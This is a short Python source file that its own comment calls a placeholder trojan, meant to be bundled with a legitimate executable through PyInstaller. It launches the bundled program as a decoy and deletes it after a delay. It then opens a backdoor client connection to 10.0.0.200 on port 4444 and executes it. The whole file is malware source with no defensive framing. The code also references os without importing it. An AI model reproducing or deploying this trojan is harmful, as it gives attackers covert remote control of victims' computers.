# This is a placeholder trojan that gets edited in the FILEstrip script.
# It is combined with an executable through Pyinstaller.

import subprocess, sys, shutil, time, backdoor, threading
def kill_proc():
	global name, timer
	try:
		os.remove(name)
		timer.cancel()
	except:
		timer = threading.Timer(5, kill_proc)
		timer.start()

global name
name = sys._MEIPASS + "NAME"
subprocess.Popen(name,shell=True)
time.sleep(2)
kill_proc()
backdoor = backdoor.BackdoorClient("10.0.0.200", 4444)
backdoor.execute()
